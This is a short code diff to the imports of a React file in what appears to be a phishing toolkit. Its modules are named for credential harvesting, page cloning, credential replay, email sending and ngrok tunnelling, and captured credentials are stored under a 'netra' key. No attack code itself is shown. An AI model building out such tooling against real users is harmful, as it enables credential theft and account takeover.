@@ -5,6 +5,7 @@ import { useState, useEffect, useRef } from 'react';
 import type { CapturedCredential } from '@/components/credential-harvester';
 import { useToast } from '@/hooks/use-toast';
 import { CredentialHarvester } from '@/components/credential-harvester';
+import { JavaScriptLibrary } from '@/components/javascript-library';
 import { AdvancedPageCloner } from '@/components/advanced-page-cloner';
 import { Separator } from '@/components/ui/separator';
 import { CredentialReplayer } from '@/components/credential-replayer';
@@ -13,9 +14,7 @@ import type { JsPayload } from '@/types';
 import { logActivity } from '@/services/activity-log-service';
 import { useAuth } from '@/hooks/use-auth';
 import { EmailSender } from '@/components/email-sender';
-import { hostPageOnServer } from '@/actions/host-page-action';
-import { QrCodeGenerator } from '@/components/qr-code-generator';
-import { JavaScriptLibrary } from '@/components/javascript-library';
+import { startNgrokTunnel } from '@/services/ngrok-service';
 
 const storageKey = 'netra-captured-credentials';
 
